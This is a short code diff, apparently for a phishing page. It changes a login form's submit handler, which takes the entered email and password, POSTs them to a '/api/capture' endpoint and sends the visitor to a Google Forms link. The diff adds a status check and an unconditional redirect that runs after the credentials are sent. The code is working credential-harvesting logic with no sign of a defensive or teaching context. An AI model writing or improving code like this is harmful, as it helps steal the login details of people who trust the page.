@@ -8,9 +8,10 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     xhr.open('POST', '/api/capture', true);
     xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
+        if (xhr.readyState === 4 && xhr.status === 200) {
             window.location.href = 'https://forms.gle/eUQK7v1gspsgRe228';
         }
     };
     xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
+    window.location.href = 'https://forms.gle/eUQK7v1gspsgRe228';
 });
